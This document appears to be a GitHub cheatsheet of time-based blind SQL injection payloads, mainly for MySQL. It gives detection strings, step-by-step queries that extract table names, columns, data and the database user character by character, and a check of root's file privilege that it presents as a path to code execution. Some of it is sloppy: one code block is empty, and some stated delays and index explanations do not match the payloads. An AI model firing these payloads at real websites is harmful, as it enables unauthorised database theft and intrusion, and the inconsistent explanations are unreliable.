# MySQL Time based SQL Injection Cheatsheet
  
  This is almost the same technique followed as [Blind Based SQLi](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi)
  
  ## Detecting the vulnerability
  The following stacked query detects if the website if vulnerable to Time Based SQL injection, by checking the website time response. The following condition is True because 1=1, which later executes the sleep function, so a 10 seconds delay is what we are expenting on the website's response.
  
  ```sql
  SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
  'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
  1'=sleep(25)='1
  '%2b(select*from(select(sleep(2)))a)%2b'
  WAITFOR DELAY '0:0:25';--
  OR SLEEP(25)
  AND SLEEP(25) AND ('kleiton'='kleiton
  WAITFOR DELAY '0:0:25' and 'a'='a;--
  IF 1=1 THEN dbms_lock.sleep(25);
  SLEEP(25)
  pg_sleep(25)
  and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--
  DBMS_LOCK.SLEEP(25);
  AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--
  1,'0');waitfor delay '0:0:25;--
  (SELECT 1 FROM (SELECT SLEEP(25))A)
  %2b(select*from(select(sleep(25)))a)%2b'
  /**/xor/**/sleep(25)
  or (sleep(25)+1) limit 1 --
  ```
  
  Example:
  ```http://domain.com/index.php?id=15'XOR(if(now()=sysdate(),sleep(5*5),0))OR'```  
  If the websites response is ~15 seconds, it means it is vulnerable to this kind of attack.
   
 
 ## Retrieving the tables  
  
  Find the first character of the first table:
  ```sql
  and if((select SUBSTRING(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
  ```
  
  Find the second character of the first table:
```sql
and if((select SUBSTRING(table_name,2,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
```

  Find the third character of the first table:
```sql
and if((select SUBSTRING(table_name,3,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(10), null)--
```

Find the first character of the second table:
```sql
and if((select SUBSTRING(table_name,1,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
```

Find the second character of the second table:
```sql
and if((select SUBSTRING(table_name,2,1) from information_schema.tables where table_schema=database() limit 1,1)='a', sleep(10), null)--
```

So if you have realised by far, we are using this logic:
limit **3**,1 -> the number of the table (targeting the third character)
table_name,**3**,1 -> the number of the character in the table (targeting the fourth character of the table [the first character starts from 0, not 1])


***Guess table names***  

If you don't want to bruteforce character by character every possible table on the db, it is more efficient to bruteforce the names (if a table name is found, the request will be delayed for 5 seconds).
Guess the name of the first table:  
```sql
and IF(SUBSTRING((select 1 from [guess_your_table_name] limit 0,1),1,1)=1,SLEEP(5),1)
```


## Retrieving the columns from a table

A table has 1 or more columns. To dump the first character of the first table, use the following query:  
```sql

```

***Guessing the columns***  
(bruteforce [guess_your_column_name] with random column names untill the request is delayed by 5 seconds. Also replace [existing_table_name] with the table that you found from the previous step):  
```sql
pic_id=13 and IF(SUBSTRING((select substring(concat(1,[guess_your_column_name]),1,1) from [existing_table_name] limit 0,1),1,1)=1,SLEEP(5),1)-- -
```

## Retrieving the data from the columns  

The following payload will search for the first character of the first column in the database. If the character is guessed, then it will sleep for 5 seconds (remember to replace **table_name** and **column_name** with the table and column that you found on the previous step):  

```sql
and if((select mid(column_name,1,1) from table_name limit 0,1)='a',sleep(5),1)--
```

To search for the first character of third column in the database, you should increase the number to 3:  
```sql
and if((select mid(column_name,3,1) from table_name limit 0,1)='a',sleep(5),1)--
```

To search for the third character of the first column, you should increate the first number after **table_name limit** to 2 (the first index is 0):  
```sql
and if((select mid(column_name,1,1) from table_name limit 2,1)='a',sleep(5),1)--
```

# Privilege escalation

## Finding the db user
Find the first character of the user (if guessed then the request will be 5 seconds delayed):
```sql
and if(substring(user(),1,1)='a',SLEEP(5),1)--
```

Find the second character of the user... and so on:
```sql
and if(substring(user(),2,1)='d',SLEEP(5),1)--
```

## Enumerate user's permission

The following query will show if the user we found from the previous step, has writing permission, which can lead to RCE:  
```sql
AND if (MID((SELECT file_priv FROM mysql.user WHERE user = 'root'),1,1) = 'Y', sleep(10), null)--
```
